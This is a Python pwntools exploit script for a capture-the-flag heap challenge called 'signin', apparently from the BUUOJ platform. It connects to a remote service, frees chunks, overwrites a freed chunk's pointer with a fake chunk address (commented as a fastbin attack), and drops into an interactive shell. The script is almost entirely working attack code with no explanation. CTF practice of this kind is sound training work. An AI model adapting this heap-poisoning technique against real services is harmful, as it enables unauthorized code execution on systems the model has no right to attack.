#! /usr/bin/python

from pwn import *

p = process('./signin')
p = remote('node3.buuoj.cn',29073)
elf = ELF('./signin')
context.log_level = 'debug'


def menu(choice):
	p.recvuntil('choice?')
	p.sendline(str(choice))

def add(idx):
	menu(1)
	p.recvuntil('idx?\n')
	p.sendline(str(idx))

def edit(idx,content):
	menu(2)
	p.recvuntil('idx?\n')
	p.sendline(str(idx))
	p.sendline(content)

def delete(idx):
	menu(3)
	p.recvuntil('idx?\n')
	p.sendline(str(idx))

fake_chunk = 0x4040C0 - 0x18
#gdb.attach(p,'b *0x40149B')
###fastbin attack###

for i in range(8):
	add(i)

for i in range(8):
	delete(i)

edit(7,p64(fake_chunk))
add(0)
menu(6)

print p.recv()
###get shell###
p.interactive()
